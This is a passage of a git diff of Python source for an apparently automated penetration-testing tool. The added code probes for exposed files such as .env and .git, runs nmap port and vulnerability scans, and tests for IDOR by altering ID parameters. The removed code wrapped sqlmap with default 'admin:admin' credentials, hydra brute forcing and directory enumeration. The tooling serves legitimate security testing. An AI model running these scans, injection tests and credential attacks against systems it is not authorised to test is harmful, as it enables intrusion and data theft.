+            ]
+            
+            base_url = url.rstrip('/')
+            
+            for path in common_paths:
+                try:
+                    test_url = base_url + path
+                    response = self.session.get(test_url, timeout=10)
+                    
+                    if response.status_code == 200:
+                        severity = self._assess_file_risk(path, response)
+                        if severity != 'Info':
+                            vulnerabilities.append({
+                                'type': 'Information Disclosure',
+                                'severity': severity,
+                                'url': test_url,
+                                'evidence': f'Accessible file/directory: {path}',
+                                'cvss_score': 7.0 if severity == 'High' else 4.0
+                            })
+                            
+                except Exception:
+                    continue
+                    
+        except Exception as e:
+            logging.error(f"Basic web app testing error: {e}")
+        
+        return vulnerabilities
+    
+    def _assess_file_risk(self, path: str, response) -> str:
+        """Assess risk level of accessible files"""
+        high_risk_indicators = [
+            'phpinfo', 'database', 'config', 'backup', '.env', '.git',
+            'admin', 'debug', 'test'
+        ]
+        
+        medium_risk_indicators = [
+            'robots.txt', 'sitemap.xml'
+        ]
+        
+        path_lower = path.lower()
+        content_lower = response.text[:1000].lower()
+        
+        # Check for high-risk files
+        if any(indicator in path_lower for indicator in high_risk_indicators):
+            return 'High'
+        
+        # Check for sensitive content in response
+        if any(keyword in content_lower for keyword in 
+               ['password', 'database', 'config', 'secret', 'key', 'token']):
+            return 'High'
+        
+        # Check for medium-risk files
+        if any(indicator in path_lower for indicator in medium_risk_indicators):
+            return 'Medium'
+        
+        return 'Low'
+    
+    async def _nmap_network_scan(self, url: str) -> List[Dict]:
+        """Perform comprehensive network scanning using nmap CLI"""
+        vulnerabilities = []
+        
+        if not self.tools['nmap']:
+            return vulnerabilities
+        
+        try:
+            # Extract target from URL
+            parsed_url = urlparse(url)
+            target = parsed_url.hostname
+            
+            if not target:
+                return vulnerabilities
+            
+            # Comprehensive nmap scan
+            nmap_commands = [
+                # TCP SYN scan for common ports
+                ['nmap', '-sS', '-T4', '--top-ports', '1000', '-oN', '-', target],
+                # Service and version detection
+                ['nmap', '-sV', '-sC', '--top-ports', '100', '-oN', '-', target],
+                # UDP scan for common services
+                ['nmap', '-sU', '--top-ports', '50', '-T4', '-oN', '-', target],
+                # Vulnerability scanning scripts
+                ['nmap', '--script', 'vuln', '--script-timeout', '60s', '-p-', target]
+            ]
+            
+            scan_results = []
+            
+            for cmd in nmap_commands:
+                try:
+                    process = await asyncio.create_subprocess_exec(
+                        *cmd, 
+                        stdout=asyncio.subprocess.PIPE, 
+                        stderr=asyncio.subprocess.PIPE
+                    )
+                    
+                    stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)
+                    output = stdout.decode('utf-8', errors='ignore')
+                    scan_results.append(output)
+                    
+                    # Parse results for vulnerabilities
+                    vulns = self._parse_nmap_output(output, cmd[1])
+                    vulnerabilities.extend(vulns)
+                    
+                except asyncio.TimeoutError:
+                    logging.warning(f"Nmap scan timed out for command: {' '.join(cmd[:3])}")
+                except Exception as e:
+                    logging.error(f"Nmap scan error for {' '.join(cmd[:3])}: {e}")
+                    
+        except Exception as e:
+            logging.error(f"Network scanning error: {e}")
+        
+        return vulnerabilities
+    
+    def _parse_nmap_output(self, output: str, scan_type: str) -> List[Dict]:
+        """Parse nmap output for security findings"""
+        vulnerabilities = []
+        
+        try:
+            lines = output.split('\n')
+            current_port = None
+            
+            for line in lines:
+                line = line.strip()
+                
+                # Parse open ports
+                if '/tcp' in line or '/udp' in line:
+                    if 'open' in line:
+                        port_info = line.split()
+                        if len(port_info) >= 3:
+                            port_number = port_info[0].split('/')[0]
+                            service = port_info[2] if len(port_info) > 2 else 'unknown'
+                            
+                            # Identify high-risk services
+                            risk_level = self._assess_service_risk(port_number, service)
+                            if risk_level in ['High', 'Critical']:
+                                vulnerabilities.append({
+                                    'type': 'Open Port',
+                                    'severity': risk_level,
+                                    'port': port_number,
+                                    'service': service,
+                                    'evidence': f'Port {port_number} ({service}) is open',
+                                    'cvss_score': 7.5 if risk_level == 'High' else 9.0
+                                })
+                
+                # Parse vulnerability script results
+                if '|' in line and any(vuln_keyword in line.lower() for vuln_keyword in 
+                                     ['cve-', 'vulnerable', 'exploit', 'weak', 'insecure']):
+                    vulnerabilities.append({
+                        'type': 'Network Vulnerability',
+                        'severity': 'High',
+                        'evidence': line.strip(),
+                        'scan_type': scan_type,
+                        'cvss_score': 8.0
+                    })
+                
+                # Parse service version information for known vulnerabilities
+                if 'version' in line.lower() and any(service in line.lower() for service in 
+                                                   ['apache', 'nginx', 'ssh', 'ftp', 'mysql', 'postgresql']):
+                    version_vuln = self._check_service_version_vulnerabilities(line)
+                    if version_vuln:
+                        vulnerabilities.append(version_vuln)
+                        
+        except Exception as e:
+            logging.error(f"Error parsing nmap output: {e}")
+        
+        return vulnerabilities
+    
+    def _assess_service_risk(self, port: str, service: str) -> str:
+        """Assess risk level of discovered services"""
+        high_risk_ports = {
+            '21': 'FTP - often misconfigured',
+            '22': 'SSH - brute force target', 
+            '23': 'Telnet - unencrypted',
+            '25': 'SMTP - mail relay abuse',
+            '53': 'DNS - information disclosure',
+            '110': 'POP3 - credential exposure',
+            '143': 'IMAP - credential exposure',
+            '161': 'SNMP - information disclosure',
+            '445': 'SMB - lateral movement',
+            '1433': 'MSSQL - database access',
+            '3306': 'MySQL - database access',
+            '3389': 'RDP - brute force target',
+            '5432': 'PostgreSQL - database access',
+            '5900': 'VNC - remote access',
+            '6379': 'Redis - often unauthenticated'
+        }
+        
+        critical_services = ['telnet', 'ftp', 'rlogin', 'rsh']
+        high_risk_services = ['ssh', 'rdp', 'vnc', 'mysql', 'postgresql', 'mssql', 'oracle', 'redis', 'mongodb']
+        
+        if service.lower() in critical_services:
+            return 'Critical'
+        elif port in high_risk_ports or service.lower() in high_risk_services:
+            return 'High'
+        elif port in ['80', '443', '8080', '8443']:
+            return 'Medium'  # Web services - separate testing
+        else:
+            return 'Low'
+    
+    def _check_service_version_vulnerabilities(self, version_line: str) -> Optional[Dict]:
+        """Check for known vulnerabilities in service versions"""
+        # This is a simplified version - in practice, you'd integrate with CVE databases
+        vulnerable_patterns = {
+            'apache/2.2': {'cve': 'CVE-2017-15710', 'severity': 'High'},
+            'openssh 7.4': {'cve': 'CVE-2018-15473', 'severity': 'Medium'},
+            'mysql 5.5': {'cve': 'CVE-2016-6663', 'severity': 'High'},
+            'nginx/1.10': {'cve': 'CVE-2017-7529', 'severity': 'High'}
+        }
+        
+        for pattern, vuln_info in vulnerable_patterns.items():
+            if pattern in version_line.lower():
+                return {
+                    'type': 'Known Vulnerability',
+                    'severity': vuln_info['severity'],
+                    'cve': vuln_info['cve'],
+                    'evidence': version_line.strip(),
+                    'cvss_score': 8.0 if vuln_info['severity'] == 'High' else 5.0
+                }
+        
+        return None
+
+    async def _test_idor(self, endpoint: str) -> List[Dict]:
+        """IDOR testing implementation"""
+        vulnerabilities = []
+        
+        try:
+            # Extract potential ID parameters from URL
+            parsed_url = urlparse(endpoint)
+            query_params = parse_qs(parsed_url.query)
+            
+            # Look for common ID parameters
+            id_params = ['id', 'user_id', 'account_id', 'order_id', 'file_id', 'doc_id']
+            
+            for param_name in id_params:
+                if param_name in query_params:
+                    original_value = query_params[param_name][0]
+                    
+                    # Test IDOR by modifying ID values
+                    test_values = [
+                        str(int(original_value) + 1) if original_value.isdigit() else None,
+                        str(int(original_value) - 1) if original_value.isdigit() else None,
+                        '1', '2', '999', '0', '-1'
+                    ]
+                    
+                    for test_value in test_values:
+                        if test_value:
+                            # Create modified URL
+                            modified_params = query_params.copy()
+                            modified_params[param_name] = [test_value]
+                            
+                            # Reconstruct URL
+                            new_query = '&'.join([f"{k}={v[0]}" for k, v in modified_params.items()])
+                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
+                            
+                            try:
+                                response = self.session.get(test_url, timeout=10)
+                                
+                                # Check for successful unauthorized access
+                                if response.status_code == 200 and len(response.text) > 100:
+                                    # Basic check - in practice, you'd need more sophisticated content analysis
+                                    if any(indicator in response.text.lower() for indicator in 
+                                          ['user', 'account', 'profile', 'data', 'information']):
+                                        vulnerabilities.append({
+                                            'type': 'Insecure Direct Object Reference (IDOR)',
+                                            'severity': 'High',
+                                            'parameter': param_name,
+                                            'original_value': original_value,
+                                            'test_value': test_value,
+                                            'url': test_url,
+                                            'evidence': f'IDOR vulnerability in parameter {param_name}',
+                                            'cvss_score': 8.5
+                                        })
+                                        break  # Found IDOR, no need to test more values for this param
+                                        
+                            except Exception:
+                                continue
+                                
+        except Exception as e:
+            logging.error(f"IDOR testing error: {e}")
+        
+        return vulnerabilities
 
 class ToolCall:
     """
-        Penetration Testing Tool Calls System
-
-        This module provides a comprehensive tool calling framework for automated penetration testing.
-        It integrates various security tools including OWASP ZAP, Metasploit, SQLMap, XSStrike, Nikto,
-        Nmap, and browser automation capabilities using Playwright.
-
-        The tools are organized by test categories and can be invoked based on the test plans
-        generated by the PlannerAgent.
+    Elite VAPT Tool Execution System
+    Streamlined implementation for strategic security testing
     """
     
     def __init__(self, config: Optional[Dict] = None):
         self.config = config or {}
         self.setup_logging()
         
-        # Initialize browser automation using the dedicated PlaywrightTools
+        # Initialize browser automation
         self.browser = PlaywrightTools(debug=self.config.get('debug', False))
-        self.zap_client = None
         
-        # Tool availability check
-        self.available_tools = self._check_tool_availability()
+        # Initialize elite VAPT tester
+        self.vapt_tester = EliteVAPTTester(self.config)
         
-        # Default configurations
+        # Default configuration
         self.default_config = {
-            'zap_proxy': 'http://127.0.0.1:8080',
-            'zap_api_key': None,
-            'timeout': 300,  # 5 minutes default timeout
-            'max_threads': 5,
-            'output_dir': './pentest_results',
-            'wordlists': {
-                'common': '/usr/share/wordlists/dirb/common.txt',
-                'big': '/usr/share/wordlists/dirb/big.txt'
-            },
+            'timeout': 600,
+            'output_dir': './vapt_results',
             'debug': False
         }
         
-        # Merge with provided config
         self.config = {**self.default_config, **self.config}
-        
-        # Ensure output directory exists
         Path(self.config['output_dir']).mkdir(parents=True, exist_ok=True)
     
     def setup_logging(self):
@@ -101,1755 +1216,25 @@ class ToolCall:
         )
         self.logger = logging.getLogger(__name__)
     
-    def _check_tool_availability(self) -> Dict[str, bool]:
-        tools = {
-            'nmap': self._check_command('nmap'),
-            'sqlmap': self._check_command('sqlmap'),
-            'nikto': self._check_command('nikto'),
-            'dirb': self._check_command('dirb'),
-            'gobuster': self._check_command('gobuster'),
-            'ffuf': self._check_command('ffuf'),
-            'hydra': self._check_command('hydra'),
-            'john': self._check_command('john'),
-            'hashcat': self._check_command('hashcat'),
-            'msfconsole': self._check_command('msfconsole'),
-            'searchsploit': self._check_command('searchsploit'),
-            'zap': ZAP_AVAILABLE,
-            'playwright': PLAYWRIGHT_AVAILABLE,
-            'curl': self._check_command('curl'),
-            'wget': self._check_command('wget'),
-            'nslookup': self._check_command('nslookup'),
-            'dig': self._check_command('dig'),
-            'whois': self._check_command('whois')
-        }
+    async def execute_plan_step(self, plan_step: Dict[str, str]) -> VAPTResult:
+        """Execute strategic VAPT plan step"""
+        self.logger.info(f"Executing plan: {plan_step.get('title', 'Unknown')}")
         
-        self.logger.info(f"Available tools: {[k for k, v in tools.items() if v]}")
-        return tools
-    
-    def _check_command(self, command: str) -> bool:
         try:
-            subprocess.run([command, '--help'], 
-                         capture_output=True, 
-                         timeout=5)
-            return True
-        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
-            return False
-    
-    async def execute_plan_step(self, plan_step: Dict[str, str]) -> ToolResult:
-        title = plan_step.get('title', '').lower()
-        description = plan_step.get('description', '').lower()
-        
-        # Determine tool category based on plan content
-        if any(keyword in title or keyword in description for keyword in 
-               ['sql injection', 'sqlmap', 'database', 'union', 'blind']):
-            return await self.sql_injection_testing(plan_step)
-        
-        elif any(keyword in title or keyword in description for keyword in 
-                 ['xss', 'cross-site scripting', 'reflected', 'stored', 'dom']):
-            return await self.xss_testing(plan_step)
-        
-        elif any(keyword in title or keyword in description for keyword in 
-                 ['api', 'idor', 'authorization', 'endpoint', 'rest']):
-            return await self.api_security_testing(plan_step)
-        
-        elif any(keyword in title or keyword in description for keyword in 
-                 ['session', 'csrf', 'authentication', 'login', 'bypass']):
-            return await self.authentication_testing(plan_step)
-        
-        elif any(keyword in title or keyword in description for keyword in 
-                 ['directory', 'brute force', 'enumeration', 'path', 'file']):
-            return await self.directory_bruteforce(plan_step)
-        
-        elif any(keyword in title or keyword in description for keyword in 
-                 ['network', 'port', 'service', 'nmap', 'scan']):
-            return await self.network_scanning(plan_step)
-        
-        elif any(keyword in title or keyword in description for keyword in 
-                 ['information', 'disclosure', 'error', 'banner', 'fingerprint']):
-            return await self.information_gathering(plan_step)
-        
-        else:
-            # General web application testing
-            return await self.general_web_testing(plan_step)
-    
-    # ===== SQL INJECTION TESTING =====
-    async def sql_injection_testing(self, plan: Dict[str, str]) -> ToolResult:
-        """Execute SQL injection testing based on plan"""
-        start_time = time.time()
-        results = []
-        vulnerabilities = []
-        
-        # Extract target URL from plan description
-        target_url = self._extract_url_from_plan(plan)
-        if not target_url:
-            return ToolResult(False, "sqlmap", "", "No target URL found in plan")
-        
-        # SQLMap testing if available
-        if self.available_tools.get('sqlmap'):
-            sqlmap_result = await self._run_sqlmap(target_url, plan)
-            results.append(sqlmap_result)
-            if sqlmap_result.success and sqlmap_result.vulnerabilities_found:
-                vulnerabilities.extend(sqlmap_result.vulnerabilities_found)
-        
-        # Manual SQL injection testing with browser automation
-        if PLAYWRIGHT_AVAILABLE:
-            browser_result = await self._manual_sql_injection_test(target_url, plan)
-            results.append(browser_result)
-            if browser_result.success and browser_result.vulnerabilities_found:
-                vulnerabilities.extend(browser_result.vulnerabilities_found)
-        
-        # ZAP SQL injection scanning
-        if self.available_tools.get('zap'):
-            zap_result = await self._zap_sql_injection_scan(target_url)
-            results.append(zap_result)
-            if zap_result.success and zap_result.vulnerabilities_found:
-                vulnerabilities.extend(zap_result.vulnerabilities_found)
-        
-        execution_time = time.time() - start_time
-        combined_output = "\n".join([r.output for r in results if r.output])
-        
-        return ToolResult(
-            success=any(r.success for r in results),
-            tool_name="SQL Injection Testing Suite",
-            command="sqlmap + browser automation + zap",
-            output=combined_output,
-            execution_time=execution_time,
-            vulnerabilities_found=vulnerabilities,
-            recommendations=self._get_sql_injection_recommendations(vulnerabilities)
-        )
-    
-    async def _run_sqlmap(self, target_url: str, plan: Dict[str, str]) -> ToolResult:
-        """Run SQLMap against target with advanced parameter extraction"""
-        try:
-            # Extract comprehensive parameters from plan
-            params = self._extract_parameters_from_plan(plan)
-            form_data = self._extract_form_data_from_plan(plan)
-            tech_stack = self._extract_technology_stack_from_plan(plan)
+            result = await self.vapt_tester.execute_strategic_test(plan_step)
             
-            cmd = [
-                'sqlmap',
-                '-u', target_url,
-                '--batch',  # Non-interactive mode
-                '--random-agent',
-                '--level=3',
-                '--risk=2',
-                '--timeout=30',
-                '--retries=2',
-                '--threads=5'
-            ]
+            # Log results
+            self.logger.info(f"Plan execution completed: {result.success}")
+            self.logger.info(f"Vulnerabilities found: {len(result.vulnerabilities)}")
             
-            # Add data parameters if found
-            if params.get('data'):
-                if isinstance(params['data'], dict):
-                    # Convert dict to POST data string
-                    data_string = '&'.join([f"{k}={v}" for k, v in params['data'].items()])
-                    cmd.extend(['--data', data_string])
-                else:
-                    cmd.extend(['--data', str(params['data'])])
-            
-            # Add headers if found
-            if params.get('headers'):
-                if isinstance(params['headers'], dict):
-                    for header, value in params['headers'].items():
-                        cmd.extend(['--header', f"{header}: {value}"])
-                else:
-                    cmd.extend(['--headers', str(params['headers'])])
-            
-            # Add cookies if found
-            if params.get('cookies'):
-                if isinstance(params['cookies'], dict):
-                    cookie_string = '; '.join([f"{k}={v}" for k, v in params['cookies'].items()])
-                    cmd.extend(['--cookie', cookie_string])
-                else:
-                    cmd.extend(['--cookie', str(params['cookies'])])
-            
-            # Add specific techniques based on detected vulnerabilities
-            if 'sql_injection' in params.get('vulnerabilities', []):
-                cmd.extend(['--technique', 'BEUSTQ'])  # All techniques
-            
-            # Add database-specific options based on technology stack
-            detected_dbs = tech_stack.get('databases', [])
-            if 'mysql' in detected_dbs:
-                cmd.extend(['--dbms', 'mysql'])
-            elif 'postgresql' in detected_dbs:
-                cmd.extend(['--dbms', 'postgresql'])
-            elif 'oracle' in detected_dbs:
-                cmd.extend(['--dbms', 'oracle'])
-            elif 'mssql' in detected_dbs:
-                cmd.extend(['--dbms', 'mssql'])
-            
-            # Add form-specific testing
-            if form_data:
-                for form in form_data:
-                    if form.get('method', '').upper() == 'POST':
-                        # Test POST forms with specific data
-                        form_fields = {field['name']: 'test' for field in form.get('fields', [])}
-                        if form_fields:
-                            form_data_string = '&'.join([f"{k}={v}" for k, v in form_fields.items()])
-                            cmd.extend(['--data', form_data_string])
-                        break
-            
-            # Add authentication if detected
-            auth_methods = params.get('auth_methods', [])
-            if 'basic' in auth_methods:
-                cmd.extend(['--auth-type', 'basic', '--auth-cred', 'admin:admin'])
-            elif 'bearer' in auth_methods and params.get('headers', {}).get('Authorization'):
-                # Token already added in headers
-                pass
-            
-            # Add specific payload testing
-            if params.get('payloads'):
-                # Use custom payloads if specified
-                cmd.extend(['--suffix', ';--'])
-                cmd.extend(['--prefix', "'"])
-            
-            # Output options
-            output_file = f"{self.config['output_dir']}/sqlmap_{int(time.time())}"
-            cmd.extend(['--output-dir', self.config['output_dir']])
-            cmd.extend(['--flush-session'])  # Fresh session
-            
-            # Advanced detection options
-            cmd.extend(['--smart'])  # Smart heuristics
-            cmd.extend(['--hex'])    # Use hex encoding
-            cmd.extend(['--check-waf'])  # WAF detection
-            
-            process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
-            )
-            
-            stdout, stderr = await asyncio.wait_for(
-                process.communicate(), 
-                timeout=self.config['timeout']
-            )
-            
-            output = stdout.decode() + stderr.decode()
-            vulnerabilities = self._parse_sqlmap_output(output, params, tech_stack)
-            
-            return ToolResult(
-                success=process.returncode == 0,
-                tool_name="SQLMap Enhanced",
-                command=' '.join(cmd),
-                output=output,
-                vulnerabilities_found=vulnerabilities
-            )
+            return result
             
         except Exception as e:
-            return ToolResult(False, "SQLMap", "sqlmap", f"Error: {str(e)}")
-    
-    # ===== XSS TESTING =====
-    async def xss_testing(self, plan: Dict[str, str]) -> ToolResult:
-        """Execute XSS testing based on plan"""
-        start_time = time.time()
-        results = []
-        vulnerabilities = []
-        
-        target_url = self._extract_url_from_plan(plan)
-        if not target_url:
-            return ToolResult(False, "XSS Testing", "", "No target URL found in plan")
-        
-        # XSStrike testing (if available via custom installation)
-        if self._check_command('python3') and os.path.exists('/opt/XSStrike/xsstrike.py'):
-            xsstrike_result = await self._run_xsstrike(target_url, plan)
-            results.append(xsstrike_result)
-            if xsstrike_result.success and xsstrike_result.vulnerabilities_found:
-                vulnerabilities.extend(xsstrike_result.vulnerabilities_found)
-        
-        # Manual XSS testing with browser automation
-        if PLAYWRIGHT_AVAILABLE:
-            browser_result = await self._manual_xss_test(target_url, plan)
-            results.append(browser_result)
-            if browser_result.success and browser_result.vulnerabilities_found:
-                vulnerabilities.extend(browser_result.vulnerabilities_found)
-        
-        # ZAP XSS scanning
-        if self.available_tools.get('zap'):
-            zap_result = await self._zap_xss_scan(target_url)
-            results.append(zap_result)
-            if zap_result.success and zap_result.vulnerabilities_found:
-                vulnerabilities.extend(zap_result.vulnerabilities_found)
-        
-        execution_time = time.time() - start_time
-        combined_output = "\n".join([r.output for r in results if r.output])
-        
-        return ToolResult(
-            success=any(r.success for r in results),
-            tool_name="XSS Testing Suite",
-            command="xsstrike + browser automation + zap",
-            output=combined_output,
-            execution_time=execution_time,
-            vulnerabilities_found=vulnerabilities,
-            recommendations=self._get_xss_recommendations(vulnerabilities)
-        )
-    
-    # ===== API SECURITY TESTING =====
-    async def api_security_testing(self, plan: Dict[str, str]) -> ToolResult:
-        """Execute API security testing"""
-        start_time = time.time()
-        results = []
-        vulnerabilities = []
-        
-        target_url = self._extract_url_from_plan(plan)
-        if not target_url:
-            return ToolResult(False, "API Testing", "", "No target URL found in plan")
-        
-        # API endpoint enumeration
-        if self.available_tools.get('ffuf'):
-            ffuf_result = await self._run_ffuf_api_enum(target_url)
-            results.append(ffuf_result)
-        
-        # IDOR testing with browser automation
-        if PLAYWRIGHT_AVAILABLE:
-            idor_result = await self._test_idor_vulnerabilities(target_url, plan)
-            results.append(idor_result)
-            if idor_result.success and idor_result.vulnerabilities_found:
-                vulnerabilities.extend(idor_result.vulnerabilities_found)
-        
-        # API authorization testing
-        auth_result = await self._test_api_authorization(target_url, plan)
-        results.append(auth_result)
-        if auth_result.success and auth_result.vulnerabilities_found:
-            vulnerabilities.extend(auth_result.vulnerabilities_found)
-        
-        execution_time = time.time() - start_time
-        combined_output = "\n".join([r.output for r in results if r.output])
-        
-        return ToolResult(
-            success=any(r.success for r in results),
-            tool_name="API Security Testing Suite",
-            command="ffuf + idor testing + authorization testing",
-            output=combined_output,
-            execution_time=execution_time,
-            vulnerabilities_found=vulnerabilities,
-            recommendations=self._get_api_recommendations(vulnerabilities)
-        )
-    
-    # ===== AUTHENTICATION TESTING =====
-    async def authentication_testing(self, plan: Dict[str, str]) -> ToolResult:
-        """Execute authentication and session management testing"""
-        start_time = time.time()
-        results = []
-        vulnerabilities = []
-        
-        target_url = self._extract_url_from_plan(plan)
-        if not target_url:
-            return ToolResult(False, "Auth Testing", "", "No target URL found in plan")
-        
-        # Browser-based authentication testing
-        if PLAYWRIGHT_AVAILABLE:
-            auth_result = await self._test_authentication_bypass(target_url, plan)
-            results.append(auth_result)
-            if auth_result.success and auth_result.vulnerabilities_found:
-                vulnerabilities.extend(auth_result.vulnerabilities_found)
-            
-            # Session management testing
-            session_result = await self._test_session_management(target_url, plan)
-            results.append(session_result)
-            if session_result.success and session_result.vulnerabilities_found:
-                vulnerabilities.extend(session_result.vulnerabilities_found)
-        
-        # Brute force testing with Hydra (if login form detected)
-        if self.available_tools.get('hydra'):
-            hydra_result = await self._run_hydra_bruteforce(target_url, plan)
-            results.append(hydra_result)
-            if hydra_result.success and hydra_result.vulnerabilities_found:
-                vulnerabilities.extend(hydra_result.vulnerabilities_found)
-        
-        execution_time = time.time() - start_time
-        combined_output = "\n".join([r.output for r in results if r.output])
-        
-        return ToolResult(
-            success=any(r.success for r in results),
-            tool_name="Authentication Testing Suite",
-            command="browser automation + hydra + session testing",
-            output=combined_output,
-            execution_time=execution_time,
-            vulnerabilities_found=vulnerabilities,
-            recommendations=self._get_auth_recommendations(vulnerabilities)
-        )
-    
-    # ===== DIRECTORY BRUTE FORCE =====
-    async def directory_bruteforce(self, plan: Dict[str, str]) -> ToolResult:
-        """Execute directory and file enumeration"""
-        start_time = time.time()
-        results = []
-        vulnerabilities = []
-        
-        target_url = self._extract_url_from_plan(plan)
-        if not target_url:
-            return ToolResult(False, "Directory Enum", "", "No target URL found in plan")
-        
-        # Gobuster directory enumeration
-        if self.available_tools.get('gobuster'):
-            gobuster_result = await self._run_gobuster(target_url)
-            results.append(gobuster_result)
-        
-        # FFUF enumeration
-        if self.available_tools.get('ffuf'):
-            ffuf_result = await self._run_ffuf_directory(target_url)
-            results.append(ffuf_result)
-        
-        # DIRB enumeration
-        if self.available_tools.get('dirb'):
-            dirb_result = await self._run_dirb(target_url)
-            results.append(dirb_result)
-        
-        execution_time = time.time() - start_time
-        combined_output = "\n".join([r.output for r in results if r.output])
-        
-        return ToolResult(
-            success=any(r.success for r in results),
-            tool_name="Directory Enumeration Suite",
-            command="gobuster + ffuf + dirb",
-            output=combined_output,
-            execution_time=execution_time,
-            vulnerabilities_found=vulnerabilities,
-            recommendations=["Review exposed directories and files for sensitive information"]
-        )
-    
-    # ===== NETWORK SCANNING =====
-    async def network_scanning(self, plan: Dict[str, str]) -> ToolResult:
-        """Execute network reconnaissance and port scanning"""
-        start_time = time.time()
-        results = []
-        vulnerabilities = []
-        
-        target = self._extract_target_from_plan(plan)
-        if not target:
-            return ToolResult(False, "Network Scan", "", "No target found in plan")
-        
-        # Nmap port scanning
-        if self.available_tools.get('nmap'):
-            nmap_result = await self._run_nmap_scan(target, plan)
-            results.append(nmap_result)
-            if nmap_result.success and nmap_result.vulnerabilities_found:
-                vulnerabilities.extend(nmap_result.vulnerabilities_found)
-        
-        execution_time = time.time() - start_time
-        combined_output = "\n".join([r.output for r in results if r.output])
-        
-        return ToolResult(
-            success=any(r.success for r in results),
-            tool_name="Network Scanning Suite",
-            command="nmap",
-            output=combined_output,
-            execution_time=execution_time,
-            vulnerabilities_found=vulnerabilities,
-            recommendations=self._get_network_recommendations(vulnerabilities)
-        )
-    
-    # ===== INFORMATION GATHERING =====
-    async def information_gathering(self, plan: Dict[str, str]) -> ToolResult:
-        """Execute information gathering and reconnaissance"""
-        start_time = time.time()
-        results = []
-        vulnerabilities = []
-        
-        target_url = self._extract_url_from_plan(plan)
-        if not target_url:
-            return ToolResult(False, "Info Gathering", "", "No target URL found in plan")
-        
-        # Nikto web server scanning
-        if self.available_tools.get('nikto'):
-            nikto_result = await self._run_nikto(target_url)
-            results.append(nikto_result)
-            if nikto_result.success and nikto_result.vulnerabilities_found:
-                vulnerabilities.extend(nikto_result.vulnerabilities_found)
-        
-        # Technology detection with browser automation
-        if PLAYWRIGHT_AVAILABLE:
-            tech_result = await self._detect_technologies(target_url)
-            results.append(tech_result)
-        
-        # DNS enumeration
-        dns_result = await self._dns_enumeration(target_url)
-        results.append(dns_result)
-        
-        execution_time = time.time() - start_time
-        combined_output = "\n".join([r.output for r in results if r.output])
-        
-        return ToolResult(
-            success=any(r.success for r in results),
-            tool_name="Information Gathering Suite",
-            command="nikto + technology detection + dns enum",
-            output=combined_output,
-            execution_time=execution_time,
-            vulnerabilities_found=vulnerabilities,
-            recommendations=["Review exposed information for sensitive data disclosure"]
-        )
-    
-    # ===== GENERAL WEB TESTING =====
-    async def general_web_testing(self, plan: Dict[str, str]) -> ToolResult:
-        """Execute general web application security testing"""
-        start_time = time.time()
-        results = []
-        vulnerabilities = []
-        
-        target_url = self._extract_url_from_plan(plan)
-        if not target_url:
-            return ToolResult(False, "General Web Test", "", "No target URL found in plan")
-        
-        # ZAP comprehensive scanning
-        if self.available_tools.get('zap'):
-            zap_result = await self._run_zap_comprehensive_scan(target_url)
-            results.append(zap_result)
-            if zap_result.success and zap_result.vulnerabilities_found:
-                vulnerabilities.extend(zap_result.vulnerabilities_found)
-        
-        # Browser-based general testing
-        if PLAYWRIGHT_AVAILABLE:
-            browser_result = await self._general_browser_testing(target_url, plan)
-            results.append(browser_result)
-            if browser_result.success and browser_result.vulnerabilities_found:
-                vulnerabilities.extend(browser_result.vulnerabilities_found)
-        
-        execution_time = time.time() - start_time
-        combined_output = "\n".join([r.output for r in results if r.output])
-        
-        return ToolResult(
-            success=any(r.success for r in results),
-            tool_name="General Web Testing Suite",
-            command="zap + browser automation",
-            output=combined_output,
-            execution_time=execution_time,
-            vulnerabilities_found=vulnerabilities,
-            recommendations=["Implement comprehensive input validation and output encoding"]
-        )
-    
-    # ===== HELPER METHODS =====
-    def _extract_url_from_plan(self, plan: Dict[str, str]) -> Optional[str]:
-        text = f"{plan.get('title', '')} {plan.get('description', '')}"
-        
-        # Enhanced URL patterns for different contexts
-        url_patterns = [
-            # Standard HTTP/HTTPS URLs
-            r'https?://[^\s<>"\']+',
-            # URLs without protocol
-            r'(?:www\.)?[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*',
-            # URLs mentioned in quotes or brackets
-            r'["\']https?://[^"\']+["\']',
-            r'\[https?://[^\]]+\]',
-            # API endpoints or paths with context
-            r'/api/[a-zA-Z0-9/._-]+',
-            r'/admin/[a-zA-Z0-9/._-]*',
-            r'/auth/[a-zA-Z0-9/._-]*',
-            r'/dashboard/?',
-            r'/login/?',
-            r'/upload/[a-zA-Z0-9/._-]*'
-        ]
-        
-        for pattern in url_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            if matches:
-                url = matches[0].strip('\'"[]')
-                # Normalize URL
-                if not url.startswith(('http://', 'https://')):
-                    if url.startswith('/'):
-                        url = f"http://localhost{url}"
-                    elif '.' in url and not url.startswith('/'):
-                        url = f"http://{url}"
-                    else:
-                        url = f"http://localhost/{url}"
-                return url
-        
-        # Look for domain patterns
-        domain_patterns = [
-            r'(?:target|host|domain|server)[:=\s]+([a-zA-Z0-9.-]+)',
-            r'testing\s+(?:on|against)\s+([a-zA-Z0-9.-]+)',
-            r'vulnerability\s+(?:in|on)\s+([a-zA-Z0-9.-]+)'
-        ]
-        
-        for pattern in domain_patterns:
-            matches = re.search(pattern, text, re.IGNORECASE)
-            if matches:
-                domain = matches.group(1).strip()
-                return f"http://{domain}"
-        
-        return None
-    
-    def _extract_target_from_plan(self, plan: Dict[str, str]) -> Optional[str]:
-        """
-        Enhanced target extraction supporting IPs, domains, and hostnames
-        """
-        text = f"{plan.get('title', '')} {plan.get('description', '')}"
-        
-        # IP address patterns
-        ip_patterns = [
-            r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',  # IPv4
-            r'\b(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}\b'  # IPv6
-        ]
-        
-        for pattern in ip_patterns:
-            matches = re.findall(pattern, text)
-            if matches:
-                return matches[0]
-        
-        # Domain extraction
-        url = self._extract_url_from_plan(plan)
-        if url:
-            from urllib.parse import urlparse
-            parsed = urlparse(url)
-            return parsed.hostname or parsed.netloc
-        
-        # Hostname patterns
-        hostname_patterns = [
-            r'\b([a-zA-Z0-9-]+\.(?:com|org|net|edu|gov|mil|int|local))\b',
